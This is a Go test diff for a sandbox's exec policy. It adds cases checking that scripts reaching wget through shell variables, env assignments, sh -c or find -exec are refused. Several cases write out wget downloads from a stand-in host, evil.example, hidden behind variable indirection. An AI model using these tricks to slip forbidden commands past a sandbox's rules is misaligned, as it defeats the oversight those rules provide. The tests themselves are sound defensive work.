@@ -502,9 +502,10 @@ func TestStdinScreenNumbersTheStatementItCutsShort(t *testing.T) {
 }
 
 // A shell's -c text in a statement is read as a script of its own, and the
-// variables the exec sets are known text, so a program named by either is
-// judged by the rules it would otherwise pass, under the server's rules and
-// a caller's policy layer alike.
+// variables the exec and the command's own assignments set are known text,
+// so a program named by either is judged by the rules it would otherwise
+// pass; one named by a variable not known here is refused, as on an exec.
+// Under the server's rules and a caller's policy layer alike.
 func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 	for name, mod := range map[string]func(*Options){
 		"server rules": func(o *Options) {
@@ -551,12 +552,19 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				{nil, "bash -c '$(echo wget) https://evil.example/x' </dev/null\n"},
 				{nil, "sh -ec 'c=git; $c push origin main' </dev/null\n"},
 				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
+				{nil, "env c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
+				{nil, "c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
+				{nil, "env -i c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
+				// A variable the image or the sandbox sets is not known here.
+				{nil, "$IMAGEVAR https://evil.example/x </dev/null\n"},
+				{nil, "sh -c '$IMAGEVAR https://evil.example/x' </dev/null\n"},
+				{nil, "find . -exec sh -c 'c=wget; $c https://evil.example/x' \\; </dev/null\n"},
 			} {
 				if got := run(c.env, c.script); got.Type != "error" || got.Error == nil || got.Error.Code != "forbidden" {
 					t.Errorf("%q with %q: %+v", c.script, c.env, got)
 				}
 			}
-			if got := run([]string{"D=/tmp"}, "sh -c 'ls -la \"$D\"' </dev/null\nrm -rf build\n"); got.Type != "exit" {
+			if got := run([]string{"D=/tmp"}, "sh -c 'ls -la \"$D\"' </dev/null\nrm -rf build\nc=ls\n$c -la </dev/null\n"); got.Type != "exit" {
 				t.Fatalf("a readable script: %+v %+v", got, got.Error)
 			}
 		})
